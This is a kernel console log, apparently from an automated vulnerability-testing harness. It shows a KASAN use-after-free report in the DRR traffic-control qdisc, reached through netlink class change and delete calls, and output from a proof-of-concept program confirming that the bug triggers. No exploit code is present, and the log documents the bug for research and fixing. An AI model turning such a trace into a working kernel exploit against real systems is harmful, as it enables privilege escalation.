[    1.133303] Code: 64 89 02 48 c7 c0 ff ff ff ff eb b7 66 2e 0f 1f 84 00 00 00 00 00 90 80 3d 71 fe 06 00 00 41 89 ca 74 14 b8 2c 00 00 00 0f 05 <48> 3d 00 f0 ff ff 77 75 c3 0f 1f 40 00 55 48 83 ec 30 44 89 4c 24
[    1.133304] RSP: 002b:00007ffca2d0e9b8 EFLAGS: 00000202 ORIG_RAX: 000000000000002c
[    1.133306] RAX: ffffffffffffffda RBX: 00007ffca2d0ea10 RCX: 000000000043c213
[    1.133307] RDX: 0000000000000001 RSI: 00007ffca2d0e9c5 RDI: 0000000000000004
[    1.133308] RBP: 0000000000000003 R08: 00007ffca2d0e9e0 R09: 0000000000000010
[    1.133309] R10: 0000000000000000 R11: 0000000000000202 R12: 0000000000000001
[    1.133309] R13: 0000000000000004 R14: 00007ffca2d0e9c5 R15: 00007ffca2d0e9e0
[    1.133311]  </TASK>
[    1.133311] 
[    1.144335] Allocated by task 67:
[    1.144470]  kasan_save_stack+0x33/0x60
[    1.144625]  kasan_save_track+0x14/0x30
[    1.144780]  __kasan_kmalloc+0x8f/0xa0
[    1.144931]  drr_change_class+0x36d/0xb50
[    1.145091]  tc_ctl_tclass+0x470/0x1450
[    1.145246]  rtnetlink_rcv_msg+0x367/0xa40
[    1.145411]  netlink_rcv_skb+0x11c/0x350
[    1.145569]  netlink_unicast+0x5c3/0x830
[    1.145726]  netlink_sendmsg+0x75a/0xc00
[    1.145883]  __sys_sendto+0x3b3/0x430
[    1.146030]  __x64_sys_sendto+0xdb/0x1b0
[    1.146188]  do_syscall_64+0xa8/0x270
[    1.146337]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[    1.146537] 
[    1.146604] Freed by task 67:
[    1.146727]  kasan_save_stack+0x33/0x60
[    1.146881]  kasan_save_track+0x14/0x30
[    1.147035]  kasan_save_free_info+0x3b/0x60
[    1.147202]  __kasan_slab_free+0x37/0x50
[    1.147361]  kfree+0xcf/0x360
[    1.147484]  drr_delete_class+0x2c3/0x470
[    1.147644]  tc_ctl_tclass+0xfbc/0x1450
[    1.147798]  rtnetlink_rcv_msg+0x367/0xa40
[    1.147962]  netlink_rcv_skb+0x11c/0x350
[    1.148119]  netlink_unicast+0x5c3/0x830
[    1.148276]  netlink_sendmsg+0x75a/0xc00
[    1.148434]  __sys_sendto+0x3b3/0x430
[    1.148582]  __x64_sys_sendto+0xdb/0x1b0
[    1.148739]  do_syscall_64+0xa8/0x270
[    1.148888]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[    1.149087] 
[    1.149155] The buggy address belongs to the object at ffff88800951b200
[    1.149155]  which belongs to the cache kmalloc-128 of size 128
[    1.149635] The buggy address is located 96 bytes inside of
[    1.149635]  freed 128-byte region [ffff88800951b200, ffff88800951b280)
[    1.150100] 
[    1.150167] The buggy address belongs to the physical page:
[    1.150387] page: refcount:0 mapcount:0 mapping:0000000000000000 index:0x0 pfn:0x951b
[    1.150690] flags: 0x100000000000000(node=0|zone=1)
[    1.150885] page_type: f5(slab)
[    1.151018] raw: 0100000000000000 ffff888006c41a00 dead000000000122 0000000000000000
[    1.151331] raw: 0000000000000000 0000000080100010 00000000f5000000 0000000000000000
[    1.151632] page dumped because: kasan: bad access detected
[    1.151849] 
[    1.151917] Memory state around the buggy address:
[    1.152107]  ffff88800951b100: 00 00 00 00 00 00 00 00 00 00 00 00 00 fc fc fc
[    1.152389]  ffff88800951b180: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[    1.152671] >ffff88800951b200: fa fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[    1.152951]                                                        ^
[    1.153199]  ffff88800951b280: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[    1.153480]  ffff88800951b300: fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc fc
[    1.153760] ==================================================================
[    1.154044] Disabling lock debugging due to kernel taint
poc: sent second UDP packet (UAF[    1.154545] poc (67) used greatest stack depth: 25816 bytes left
 trigger)
poc: done (no crash observed)
---- poc end rc=0 ----
secb: poc exited without crashing the kernel
[    1.485341] input: ImExPS/2 Generic Explorer Mouse as /devices/platform/i8042/serio1/input/input3
[    2.418435] ACPI: PM: Preparing to enter system sleep state S5
[    2.418754] reboot: Power down
CONFIRMED: KASAN_UAF
